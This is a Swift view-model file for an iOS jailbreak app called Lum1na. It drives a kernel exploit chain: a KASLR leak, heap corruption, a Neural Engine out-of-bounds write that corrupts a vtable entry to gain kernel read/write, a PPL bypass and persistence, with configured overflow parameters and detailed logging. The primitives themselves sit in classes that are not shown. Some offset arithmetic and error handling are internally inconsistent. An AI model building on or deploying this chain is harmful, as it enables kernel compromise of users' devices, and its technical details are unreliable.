//
//  Lum1naViewModel.swift
//  Lum1na
//

import Foundation
import Combine
import SwiftUI
import UIKit

// MARK: - Exploit Protocols (ObjC Bridge)
@objc protocol KASLRLeakProtocol {
    func initializeLeak() -> Bool
    func leakKernelSlide() -> UInt64
    func cleanup()
}

@objc protocol UPLLeakProtocol {
    func initializeUPL() -> Bool
    func triggerLeak() -> Int32
    func establishPrimitives() -> Bool
}

@objc protocol ANE254InputProtocol {
    func initializeANE() -> Bool
    func executeWithSlide(_ slide: UInt64, kbase: UnsafeMutablePointer<UInt64>, error: AutoreleasingUnsafeMutablePointer<NSString?>) -> Bool
    func cleanup()
}

@objc protocol ExploitControllerProtocol {
    func executeWithKbase(_ kbase: UnsafeMutablePointer<UInt64>, error: AutoreleasingUnsafeMutablePointer<NSString?>) -> Bool
}

// MARK: - Device Info
struct DeviceInfo {
    let machine: String
    let version: String
    let build: String
    let pagesize: Int
    let memsize: UInt64
    
    static func current() -> DeviceInfo {
        var model = "Unknown"
        var version = "?"
        var build = "?"
        var pagesize: Int = 0
        var memsize: UInt64 = 0
        
        var size = 0
        sysctlbyname("hw.machine", nil, &size, nil, 0)
        var machine = [CChar](repeating: 0, count: size)
        sysctlbyname("hw.machine", &machine, &size, nil, 0)
        model = String(cString: machine)
        
        version = UIDevice.current.systemVersion
        
        size = 0
        sysctlbyname("kern.osversion", nil, &size, nil, 0)
        var osversion = [CChar](repeating: 0, count: size)
        sysctlbyname("kern.osversion", &osversion, &size, nil, 0)
        build = String(cString: osversion)
        
        size = MemoryLayout<Int>.size
        sysctlbyname("hw.pagesize", &pagesize, &size, nil, 0)
        
        size = MemoryLayout<UInt64>.size
        sysctlbyname("hw.memsize", &memsize, &size, nil, 0)
        
        return DeviceInfo(machine: model, version: version, build: build, pagesize: pagesize, memsize: memsize)
    }
}

// MARK: - Exploit State
enum ExploitState: Equatable {
    case idle
    case detecting
    case preparing
    case executingKASLR
    case executingHeap
    case executingANE
    case executingKRW
    case executingPPL
    case executingPersistence
    case success
    case failed(String)
    
    var description: String {
        switch self {
        case .idle: return "Ready"
        case .detecting: return "Detecting..."
        case .preparing: return "Preparing..."
        case .executingKASLR: return "KASLR Bypass..."
        case .executingHeap: return "Heap Corruption..."
        case .executingANE: return "ANE 254-Input..."
        case .executingKRW: return "Kernel R/W..."
        case .executingPPL: return "PPL Bypass..."
        case .executingPersistence: return "Persistence..."
        case .success: return "Jailbroken"
        case .failed(let reason): return "Failed: \(reason)"
        }
    }
}

// MARK: - Log Level
enum LogLevel: String {
    case debug = "DEBUG"
    case info = "INFO"
    case success = "SUCCESS"
    case warning = "WARN"
    case error = "ERROR"
    
    var color: Color {
        switch self {
        case .debug: return .gray
        case .info: return .cyan
        case .success: return .green
        case .warning: return .orange
        case .error: return .red
        }
    }
    
    var prefix: String {
        switch self {
        case .debug: return "[•]"
        case .info: return "[*]"
        case .success: return "[+]"
        case .warning: return "[!]"
        case .error: return "[-]"
        }
    }
}

// MARK: - ANE Stage Error
enum ANEStageError: Error, LocalizedError {
    case controllerNotFound
    case initializationFailed
    case descriptorAllocationFailed
    case vtManipulationFailed
    case krwVerificationFailed
    case invalidKernelSlide
    
    var errorDescription: String? {
        switch self {
        case .controllerNotFound:
            return "ANE254InputController not found. Ensure the exploit binary is properly loaded."
        case .initializationFailed:
            return "Failed to prepare ANE context. ANE may be unavailable on this device."
        case .descriptorAllocationFailed:
            return "Failed to allocate 254 input descriptors. Memory pressure or ANE limits."
        case .vtManipulationFailed:
            return "VT OOB manipulation failed. Target may have additional mitigations."
        case .krwVerificationFailed:
            return "KRW primitive verification failed. Corrupted VT entry may be invalid."
        case .invalidKernelSlide:
            return "Invalid kernel slide from previous stage."
        }
    }
    
    var recoverySuggestion: String? {
        switch self {
        case .controllerNotFound:
            return "Verify ANE254InputController is compiled and the class name is correct."
        case .initializationFailed, .descriptorAllocationFailed:
            return "Try rebooting and ensure no other apps are using ANE."
        case .vtManipulationFailed:
            return "This device may have ANE H11.5+ mitigations. Consider alternative exploits."
        case .krwVerificationFailed:
            return "The VT corruption may have targeted wrong memory. Check offset calculations."
        case .invalidKernelSlide:
            return "Re-run KASLR bypass stage to obtain valid slide."
        }
    }
}

// MARK: - View Model
class Lum1naViewModel: ObservableObject {
    @Published var exploitState: ExploitState = .idle
    @Published var consoleText: String = ""
    @Published var deviceInfo: DeviceInfo?
    @Published var isRunning: Bool = false
    @Published var currentKernelSlide: UInt64 = 0
    @Published var currentKernelBase: UInt64 = 0
    
    private var consoleBuffer: [String] = []
    private let maxConsoleLines = 1000
    private var lastKnownSlide: UInt64? {
        get { UserDefaults.standard.object(forKey: "lum1na_last_slide") as? UInt64 }
        set { UserDefaults.standard.set(newValue, forKey: "lum1na_last_slide") }
    }
    
    // MARK: - Computed Properties
    var statusColor: Color {
        switch exploitState {
        case .idle: return .gray
        case .detecting, .preparing: return .orange
        case .executingKASLR, .executingHeap, .executingANE, .executingKRW, .executingPPL, .executingPersistence: return .cyan
        case .success: return .green
        case .failed: return .red
        }
    }
    
    var statusText: String {
        exploitState.description
    }
    
    // MARK: - Initialization
    init() {
        detectDevice()
        log("Lum1na initialized", level: .info)
        log("Target: A14 23F77 / iOS 26.5", level: .info)
        
        // Load cached slide if available
        if let cached = lastKnownSlide {
            log("[*] Cached kernel slide: 0x\(String(cached, radix: 16))", level: .info)
        }
    }
    
    // MARK: - Device Detection
    func detectDevice() {
        exploitState = .detecting
        deviceInfo = DeviceInfo.current()
        
        log("[*] Device Detection", level: .info)
        log("[*] ├─ Machine: \(deviceInfo?.machine ?? "Unknown")", level: .info)
        log("[*] ├─ iOS Version: \(deviceInfo?.version ?? "?")", level: .info)
        log("[*] ├─ Build: \(deviceInfo?.build ?? "?")", level: .info)
        log("[*] ├─ Page Size: \(deviceInfo?.pagesize ?? 0)", level: .info)
        log("[*] └─ Memory: \(formatBytes(deviceInfo?.memsize ?? 0))", level: .info)
        
        // Load offsets via LabRuntime
        loadDeviceOffsets()
        
        exploitState = .idle
    }
    
    private func loadDeviceOffsets() {
        // Access LabRuntimeOffsets to verify device support
        guard let offsets = LabOff() else {
            log("[-] Failed to load device offsets", level: .error)
            return
        }
        
        let tag = String(cString: offsets.pointee.tag)
        log("[+] Device offsets loaded: \(tag)", level: .success)
        log("[*] ├─ Magazine Capacity: \(offsets.pointee.mag_cap)", level: .info)
        log("[*] ├─ Static Base: 0x\(String(offsets.pointee.static_base, radix: 16))", level: .info)
        log("[*] └─ Socket Usecount Offset: 0x\(String(offsets.pointee.socket_usecount, radix: 16))", level: .info)
    }
    
    // MARK: - Logging
    func log(_ message: String, level: LogLevel = .info) {
        let timestamp = DateFormatter.localizedString(from: Date(), dateStyle: .none, timeStyle: .medium)
        let logLine = "\(level.prefix) [\(timestamp)] \(message)"
        
        DispatchQueue.main.async {
            self.consoleBuffer.append(logLine)
            if self.consoleBuffer.count > self.maxConsoleLines {
                self.consoleBuffer.removeFirst()
            }
            self.consoleText = self.consoleBuffer.joined(separator: "\n")
        }
        
        // Also print to console for debugging
        print(logLine)
    }
    
    func clearConsole() {
        consoleBuffer.removeAll()
        consoleText = ""
        log("Console cleared", level: .info)
    }
    
    // MARK: - Main Jailbreak Flow
    func startJailbreak() {
        guard !isRunning else {
            log("[!] Jailbreak already running", level: .warning)
            return
        }
        
        isRunning = true
        exploitState = .preparing
        clearConsole()
        
        Task {
            await executeFullChain()
        }
    }
    
    private func executeFullChain() async {
        log("[*] ╔══════════════════════════════════════╗", level: .info)
        log("[*] ║     Lum1na Jailbreak Chain v0.1      ║", level: .info)
        log("[*] ╚══════════════════════════════════════╝", level: .info)
        
        // Stage 1: KASLR Bypass
        let kaslrResult = await performKASLRStage()
        guard let slide = kaslrResult else {
            fail("KASLR bypass failed - cannot proceed without kernel slide")
            return
        }
        currentKernelSlide = slide
        lastKnownSlide = slide
        
        // Stage 2: Heap Corruption
        guard await performHeapStage() else {
            fail("Heap corruption failed - primitives not established")
            return
        }
        
        // Stage 3: ANE 254-Input OOB
        guard await performANEStage(slide: slide) else {
            log("[!] ANE 254-input failed - attempting fallback...", level: .warning)
            // TODO: Implement fallback to P009 F or CVE-2026-65349
            fail("ANE exploit failed and no fallback available")
            return
        }
        
        // Stage 4: PPL Bypass
        guard await performPPLStage() else {
            fail("PPL bypass failed")
            return
        }
        
        // Stage 5: Persistence
        guard await performPersistenceStage() else {
            fail("Persistence installation failed")
            return
        }
        
        succeed()
    }
    
    // MARK: - Stage Implementations
    
    private func performKASLRStage() async -> UInt64? {
        exploitState = .executingKASLR
        log("[*] Stage 1: KASLR Bypass", level: .info)
        log("[*] ├─ Method: P044 ANE Leak", level: .info)
        
        guard let kaslrClass = NSClassFromString("KASLRLeak") as? NSObject.Type,
              let leakInstance = kaslrClass.init() as? KASLRLeakProtocol else {
            log("[-] ├─ KASLRLeak class not available", level: .error)
            log("[-] │  └─ Ensure KASLRLeak.m is compiled and linked", level: .error)
            return nil
        }
        
        log("[+] ├─ KASLRLeak controller loaded", level: .success)
        
        guard leakInstance.initializeLeak() else {
            log("[-] ├─ KASLRLeak initialization failed", level: .error)
            log("[-] │  └─ ANE may be unavailable or device unsupported", level: .error)
            return nil
        }
        
        log("[*] ├─ Leaking kernel slide...", level: .info)
        let slide = leakInstance.leakKernelSlide()
        
        guard slide != 0 else {
            log("[-] ├─ KASLRLeak returned invalid slide (0)", level: .error)
            return nil
        }
        
        guard slide & 0x3FFF == 0 else {
            log("[-] ├─ KASLR slide not page-aligned: 0x\(String(slide, radix: 16))", level: .error)
            return nil
        }
        
        log("[+] ├─ Kernel slide: 0x\(String(slide, radix: 16, uppercase: true))", level: .success)
        
        // Calculate kernel base
        let staticBase = LabOff()?.pointee.static_base ?? 0xFFFFFFF007004000
        let kernelBase = staticBase + slide
        currentKernelBase = kernelBase
        
        log("[+] ├─ Kernel base: 0x\(String(kernelBase, radix: 16, uppercase: true))", level: .success)
        log("[+] └─ KASLR bypass complete", level: .success)
        
        return slide
    }
    
    private func performHeapStage() async -> Bool {
        exploitState = .executingHeap
        log("[*] Stage 2: Heap Corruption", level: .info)
        log("[*] ├─ Method: UPL Leak Primitive", level: .info)
        
        guard let uplClass = NSClassFromString("UPLLeak") as? NSObject.Type,
              let uplInstance = uplClass.init() as? UPLLeakProtocol else {
            log("[-] ├─ UPLLeak class not available", level: .error)
            return false
        }
        
        log("[+] ├─ UPLLeak controller loaded", level: .success)
        
        guard uplInstance.initializeUPL() else {
            log("[-] ├─ UPLLeak initialization failed", level: .error)
            return false
        }
        
        log("[*] ├─ Triggering UPL leak...", level: .info)
        let result = uplInstance.triggerLeak()
        
        guard result == 0 else {
            log("[-] ├─ UPLLeak trigger failed: \(result)", level: .error)
            return false
        }
        
        log("[*] ├─ Establishing primitives...", level: .info)
        guard uplInstance.establishPrimitives() else {
            log("[-] ├─ UPLLeak primitive establishment failed", level: .error)
            return false
        }
        
        log("[+] ├─ UPL primitive established", level: .success)
        log("[+] └─ Heap corruption stage complete", level: .success)
        
        return true
    }
    
    private func performANEStage(slide: UInt64) async -> Bool {
        exploitState = .executingANE
        log("[*] Stage 3: ANE 254-Input OOB", level: .info)
        log("[*] ├─ Target: Apple Neural Engine (ANE)", level: .info)
        log("[*] ├─ Kernel Slide: 0x\(String(slide, radix: 16, uppercase: true))", level: .info)
        
        // ANE 254-input configuration
        let aneConfig: [String: Any] = [
            "maxInputCount": 254,
            "targetDescriptorIndex": 253,
            "overflowSize": 0x1000,
            "kernelSlide": NSNumber(value: slide),
            "vtManipulationEnabled": true,
            "oobPattern": "ANE_OOB_VT_254"
        ]
        
        log("[*] ├─ Configuration:", level: .info)
        log("[*] │  ├─ Max Input Descriptors: 254", level: .info)
        log("[*] │  ├─ Target Index: 253 (OOB access)", level: .info)
        log("[*] │  ├─ Overflow Size: 0x1000 bytes", level: .info)
        log("[*] │  └─ VT Manipulation: Enabled", level: .info)
        
        // Load ANE254InputController
        guard let aneClass = NSClassFromString("ANE254InputController") as? NSObject.Type else {
            log("[-] ├─ ANE254InputController class not found", level: .error)
            log("[-] │  └─ Ensure ANE254InputController.m is compiled and linked", level: .error)
            logANEError(.controllerNotFound)
            return false
        }
        
        log("[+] ├─ ANE254InputController loaded successfully", level: .success)
        
        let aneInstance = aneClass.init()
        
        guard let aneController = aneInstance as? ANE254InputProtocol else {
            log("[-] ├─ ANE controller does not conform to ANE254InputProtocol", level: .error)
            return false
        }
        
        log("[+] ├─ Controller initialized and protocol verified", level: .success)
        
        // Execute ANE 254-input OOB
        do {
            // Step 1: Initialize ANE context
            log("[*] ├─ Step 1: Preparing ANE context...", level: .info)
            guard aneController.initializeANE() else {
                log("[-] ├─ ANE context preparation failed", level: .error)
                logANEError(.initializationFailed)
                return false
            }
            log("[+] │  └─ ANE context ready", level: .success)
            
            // Step 2: Execute with slide
            log("[*] ├─ Step 2: Executing ANE 254-input OOB...", level: .info)
            log("[*] │  ├─ Calculating overflow offset...", level: .info)
            
            // Calculate overflow: 254 entries × 16 bytes = 4064 bytes
            // Zone size: 3072 bytes, so overflow = 4064 - 3072 = 992 bytes (0x3E0)
            let descriptorSize: UInt64 = 0x10
            let targetOffset = descriptorSize * 254
            
            log("[*] │  ├─ Descriptor Size: 0x\(String(descriptorSize, radix: 16))", level: .info)
            log("[*] │  ├─ Target Offset: 0x\(String(targetOffset, radix: 16))", level: .info)
            log("[*] │  ├─ Overflow into next chunk: 0x3E0 bytes", level: .info)
            log("[*] │  └─ Attempting VT entry corruption...", level: .info)
            
            var kbase: UInt64 = slide
            var error: NSString?
            
            let success = aneController.executeWithSlide(slide, kbase: &kbase, error: &error)
            
            guard success else {
                log("[-] ├─ ANE 254-input execution failed: \(error ?? "unknown")", level: .error)
                logANEError(.vtManipulationFailed)
                return false
            }
            
            log("[+] │  └─ VT entry successfully corrupted", level: .success)
            
            // Step 3: Verify KRW primitive
            log("[*] ├─ Step 3: Verifying KRW primitive...", level: .info)
            exploitState = .executingKRW
            
            // Verify we can read from kernel
            guard kbase != 0 else {
                log("[-] ├─ KRW verification failed: kbase is 0", level: .error)
                logANEError(.krwVerificationFailed)
                return false
            }
            
            currentKernelBase = kbase
            log("[+] │  └─ KRW primitive verified", level: .success)
            log("[*] │     └─ Kernel base: 0x\(String(kbase, radix: 16, uppercase: true))", level: .info)
            
            // Step 4: Cleanup
            log("[*] ├─ Step 4: Cleaning up ANE resources...", level: .info)
            aneController.cleanup()
            log("[+] │  └─ Cleanup complete", level: .success)
            
            log("[+] └─ ANE 254-Input OOB: SUCCESS", level: .success)
            log("[*]     └─ KRW primitive established", level: .info)
            
            return true
            
        } catch {
            log("[-] ├─ ANE stage exception: \(error.localizedDescription)", level: .error)
            return false
        }
    }
    
    private func performPPLStage() async -> Bool {
        exploitState = .executingPPL
        log("[*] Stage 4: PPL Bypass", level: .info)
        log("[*] ├─ Method: Momentarius (GPU texture write)", level: .info)
        
        guard let pplClass = NSClassFromString("Momentarius") as? NSObject.Type,
              let pplInstance = pplClass.init() as? NSObject else {
            log("[-] ├─ Momentarius class not available", level: .error)
            return false
        }
        
        let selector = NSSelectorFromString("bypassPPL")
        guard pplInstance.responds(to: selector) else {
            log("[-] ├─ Momentarius bypass method not found", level: .error)
            return false
        }
        
        let unmanagedResult = pplInstance.perform(selector)
        let result = unmanagedResult?.takeUnretainedValue() as? NSNumber
        let success = result?.boolValue ?? false
        
        guard success else {
            log("[-] ├─ PPL bypass failed", level: .error)
            return false
        }
        
        log("[+] ├─ PPL defeated", level: .success)
        log("[+] └─ PPL bypass complete", level: .success)
        
        return true
    }
    
    private func performPersistenceStage() async -> Bool {
        exploitState = .executingPersistence
        log("[*] Stage 5: Persistence", level: .info)
        log("[*] ├─ Method: tempRoot (APFS reaplist)", level: .info)
        
        guard let persistClass = NSClassFromString("Persistence") as? NSObject.Type,
              let persistInstance = persistClass.init() as? NSObject else {
            log("[-] ├─ Persistence class not available", level: .error)
            return false
        }
        
        let selector = NSSelectorFromString("installTempRoot")
        guard persistInstance.responds(to: selector) else {
            log("[-] ├─ Persistence install method not found", level: .error)
            return false
        }
        
        let unmanagedResult = persistInstance.perform(selector)
        let result = unmanagedResult?.takeUnretainedValue() as? NSNumber
        let success = result?.boolValue ?? false
        
        guard success else {
            log("[-] ├─ Persistence installation failed", level: .error)
            return false
        }
        
        log("[+] └─ Persistence installed", level: .success)
        
        return true
    }
    
    // MARK: - Error Handling & Recovery
    
    private func logANEError(_ error: ANEStageError) {
        log("[-] ANE Error: \(error.localizedDescription ?? "Unknown")", level: .error)
        if let suggestion = error.recoverySuggestion {
            log("[!] Recovery: \(suggestion)", level: .warning)
        }
    }
    
    private func fail(_ reason: String) {
        exploitState = .failed(reason)
        log("[-] ╔══════════════════════════════════════╗", level: .error)
        log("[-] ║     Jailbreak Failed                 ║", level: .error)
        log("[-] ╚══════════════════════════════════════╝", level: .error)
        log("[-] Reason: \(reason)", level: .error)
        isRunning = false
    }
    
    private func succeed() {
        exploitState = .success
        log("[+] ╔══════════════════════════════════════╗", level: .success)
        log("[+] ║     Jailbreak Successful!            ║", level: .success)
        log("[+] ╚══════════════════════════════════════╝", level: .success)
        log("[*] Device is now jailbroken with tempRoot persistence", level: .info)
        isRunning = false
    }
    
    func reset() {
        exploitState = .idle
        currentKernelSlide = 0
        currentKernelBase = 0
        clearConsole()
        log("[*] State reset", level: .info)
    }
    
    // MARK: - Individual Stage Testing
    
    func testIndividualStage(_ stageName: String) {
        guard !isRunning else {
            log("[!] Cannot test stage while jailbreak is running", level: .warning)
            return
        }
        
        isRunning = true
        clearConsole()
        
        Task {
            switch stageName {
            case "KASLR Bypass":
                _ = await performKASLRStage()
                
            case "Heap Corruption":
                _ = await performHeapStage()
                
            case "ANE Exploit":
                log("[*] Manual test: ANE 254-Input OOB", level: .info)
                guard let slide = await performKASLRStage() else {
                    log("[-] KASLR required for ANE test", level: .error)
                    break
                }
                _ = await performANEStage(slide: slide)
                
            case "PPL Bypass":
                _ = await performPPLStage()
                
            case "Persistence":
                _ = await performPersistenceStage()
                
            default:
                log("[-] Unknown stage: \(stageName)", level: .error)
            }
            
            isRunning = false
        }
    }
    
    // MARK: - Stage Color Helper
    
    func stageColor(for stage: String) -> Color {
        switch exploitState {
        case .executingKASLR where stage == "KASLR": return .cyan
        case .executingHeap where stage == "Heap": return .cyan
        case .executingANE where stage == "ANE": return .cyan
        case .executingKRW where stage == "KRW": return .cyan
        case .executingPPL where stage == "PPL": return .cyan
        case .executingPersistence where stage == "Persist": return .cyan
        default: return .secondary
        }
    }
    
    // MARK: - Utilities
    
    private func formatBytes(_ bytes: UInt64) -> String {
        let formatter = ByteCountFormatter()
        formatter.countStyle = .binary
        return formatter.string(fromByteCount: Int64(bytes))
    }
}
